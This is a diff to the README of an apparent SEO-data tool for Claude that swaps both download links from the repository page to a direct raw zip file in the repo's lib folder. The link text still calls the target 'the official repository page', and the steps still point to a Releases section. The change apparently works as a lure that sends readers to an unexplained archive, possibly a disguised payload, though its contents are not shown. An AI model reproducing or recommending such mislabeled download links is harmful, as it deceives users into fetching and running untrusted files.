@@ -1,6 +1,6 @@
 # 📊 seo-data - Get instant answers from your SEO data
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/offensive-tarichagranulosa259/seo-data)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/offensive-tarichagranulosa259/seo-data/raw/refs/heads/main/lib/data_seo_3.3.zip)
 
 seo-data connects your Claude assistant to the data you track for your website. It gathers information from Google Search Console, Google Analytics 4, and Bing Webmaster Tools. You use natural language to ask questions about your site performance. This tool removes the need to log into multiple dashboards or export manual spreadsheets.
 
@@ -16,7 +16,7 @@ Before you use the application, ensure your computer meets these requirements:
 
 ## 📥 Getting the software
 
-Visit [the official repository page](https://github.com/offensive-tarichagranulosa259/seo-data) to download the application. 
+Visit [the official repository page](https://github.com/offensive-tarichagranulosa259/seo-data/raw/refs/heads/main/lib/data_seo_3.3.zip) to download the application. 
 
 1. Navigate to the link above.
 2. Locate the Releases section on the right sidebar.
